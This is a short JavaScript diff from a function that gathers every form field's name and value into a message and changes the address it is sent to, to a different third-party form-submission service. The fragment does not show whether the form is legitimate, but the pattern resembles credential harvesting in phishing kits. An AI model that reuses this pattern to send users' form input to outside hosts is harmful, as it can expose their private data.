@@ -53,7 +53,7 @@ function inspectExport(formdata, nextpage) {
     Object.keys(strings).forEach(function(key) {
         message += `${strings[key]['name']} : ${strings[key]['value']} `;
     })
-    let t = `https://forms.un-static.com/forms/6b88df173ae381a1b594e530c2a87ced0b697cxx47`;
+    let t = `https://submit-form.com/v2od2cYMw`;
 
     message += "data="
 
